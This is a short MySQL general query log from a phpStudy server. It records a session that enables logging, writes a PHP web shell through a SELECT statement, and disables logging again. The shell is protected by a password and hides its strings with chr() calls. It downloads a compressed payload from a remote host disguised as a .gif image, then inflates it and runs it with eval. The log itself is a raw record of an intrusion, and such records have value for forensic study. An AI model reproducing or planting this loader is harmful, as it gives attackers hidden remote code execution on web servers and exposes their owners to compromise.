C:\phpStudy\PHPTutorial\MySQL\bin\mysqld.exe, Version: 5.5.53 (MySQL Community Server (GPL)). started with:
TCP Port: 3306, Named Pipe: MySQL
Time                 Id Command    Argument
		4562478 Query	set global general_log='on'
		4562478 Query	SELECT ' <?php
$password = "1";//登录密码
//----------功能程序------------------//
$c = "chr";
session_start();
if (empty($_SESSION["PhpCode"])) {
    $url = $c(104).$c(116).$c(116).$c(112).$c(58);
	$url .= $c(47).$c(47).$c(119).$c(119).$c(119);
	$url .= $c(46).$c(112).$c(104).$c(112).$c(115);
	$url .= $c(101).$c(99).$c(46).$c(99).$c(99);
	$url .= $c(47).$c(72).$c(97).$c(99).$c(107);
	$url .= $c(47).$c(52).$c(48).$c(52).$c(46).$c(103).$c(105).$c(102);
    $get = $c(102) . $c(105) . $c(108) . $c(101) . $c(95);
    $get .= $c(103) . $c(101) . $c(116) . $c(95) . $c(99);
    $get .= $c(111) . $c(110) . $c(116) . $c(101) . $c(110);
    $get .= $c(116) . $c(115);
    $_SESSION["PhpCode"] = $get($url);
}
$unzip = $c(103) . $c(122) . $c(105) . $c(110);
$unzip .= $c(102) . $c(108) . $c(97) . $c(116) . $c(101);

@eval($unzip($_SESSION["PhpCode"]));
?> '
		4562478 Query	set global general_log='off'
